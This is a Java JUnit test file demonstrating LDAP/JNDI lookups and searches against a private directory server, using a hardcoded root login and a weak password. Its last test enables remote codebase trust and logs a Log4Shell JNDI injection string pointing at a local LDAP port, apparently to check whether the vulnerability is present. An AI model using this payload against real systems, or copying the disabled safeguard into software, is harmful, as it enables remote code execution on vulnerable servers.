package com.yiban.javaBase.test;

import lombok.extern.log4j.Log4j2;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.*;

import javax.naming.Context;
import javax.naming.NameNotFoundException;
import javax.naming.NamingEnumeration;
import javax.naming.NamingException;
import javax.naming.directory.*;
import java.util.Hashtable;
import java.util.LinkedList;
import java.util.List;

/**
 * @auther WEI.DUAN
 * @date 2021/6/5
 * @website http://blog.csdn.net/dwshmilyss
 */
public class LdapDemo {
    private static final String LDAP_DRIVER = "com.sun.jndi.ldap.LdapCtxFactory";
    private static final String LDAP_URL_PREFIX = "ldap://192.168.121.27/";
    private static final String LDAP_SECURITY_AUTH_TYPE = "simple";
    private static final String ROOT = "dc=dww,dc=com";
    private static final String LDAP_SECURITY_PRINCIPAL = "cn=root,dc=dww,dc=com";
    private static final String USERNAME = "dww";
    private static final String PASSWORD = "123456";
    @BeforeEach
    public void before() {
        System.out.println("before");
    }

    public static DirContext getDirContext() {

        Hashtable<String, String> env = new Hashtable();

        env.put(Context.INITIAL_CONTEXT_FACTORY, LDAP_DRIVER);
        env.put(Context.PROVIDER_URL, LDAP_URL_PREFIX + ROOT);
//        env.put(Context.SECURITY_AUTHENTICATION, LDAP_SECURITY_AUTH_TYPE);
//        env.put(Context.SECURITY_PRINCIPAL, LDAP_SECURITY_PRINCIPAL);
//        env.put(Context.SECURITY_CREDENTIALS, PASSWORD);

        DirContext ctx = null;

        try {
            ctx = new InitialDirContext(env);
            System.out.println("ldap authn success.");
            return ctx;
        } catch (NamingException e) {
            System.out.println("ldap authn fail.");
            e.printStackTrace();
        } catch (Exception ex) {
            System.out.println("ldap authn error.");
            ex.printStackTrace();
        }
        return null;
    }

    /**
     * close connection
     * @param ctx
     */
    private static void close (DirContext ctx) {

        if (null != ctx) {
            try {
                ctx.close();
                System.out.println("ldap server connection close!");
                System.exit(0);
            } catch (NamingException e) {
                System.out.println("ldap connection fail.");
                e.printStackTrace();
            }
        }
    }

    public static void JNDILookup() {
        String root = "dc=dww,dc=com";
        Hashtable env = new Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.PROVIDER_URL, "ldap://192.168.121.27/" + root);
        env.put(Context.SECURITY_AUTHENTICATION, "simple");
        env.put(Context.SECURITY_PRINCIPAL, "cn=root,dc=dww,dc=com");
        env.put(Context.SECURITY_CREDENTIALS, "123456");
        DirContext ctx = null;

        try {
            ctx = new InitialDirContext(env);
            Attributes attrs = ctx.getAttributes("dn");
            System.out.println("Last Name: " + attrs.get("ou").get());
            System.out.println("认证成功");
        } catch (javax.naming.AuthenticationException e) {
            e.printStackTrace();
            System.out.println("认证失败");
        } catch (Exception e) {
            System.out.println("认证出错：");
            e.printStackTrace();
        }
        if (ctx != null) {
            try {
                ctx.close();
            } catch (NamingException e) {
                // ignore
                e.printStackTrace();
            }
        }
    }

    @Test
    public void test() {
//        JNDILookup();
        DirContext dirContext = getDirContext();
        List<String> list = new LinkedList<String>();
        NamingEnumeration results = null;
        try {
            SearchControls controls = new SearchControls();
            controls.setSearchScope(SearchControls.SUBTREE_SCOPE);
            results = dirContext.search("", "(objectclass=dcObject)", controls);
            System.out.println("results = " + results.hasMore());
            while (results.hasMore()) {
                SearchResult searchResult = (SearchResult) results.next();
                Attributes attributes = searchResult.getAttributes();
                Attribute attr = attributes.get("dc");
                String dc = attr.get().toString();
                System.out.println("dc = " + dc);
                System.out.println("attributes.get(\"o\").get().toString() = " + attributes.get("o").get().toString());
                System.out.println("attributes.get(\"objectClass\").get().toString() = " + attributes.get("objectClass").get().toString());
//                list.add(cn);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        close(dirContext);
    }

    private static final Logger logger = LogManager.getLogger(Log4j2.class);
    @Test
    public void testLog4j2Venerability() {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error("params:{}", "${jndi:ldap://127.0.0.1:1389/Log4jTest}");
    }

    @AfterEach
    public void after() {
        System.out.println("after");
    }

    @BeforeAll
    public static void beforeAll() {
        System.out.println("beforeAll");
    }

    @AfterAll
    public static void afterAll() {
        System.out.println("afterAll");
    }
}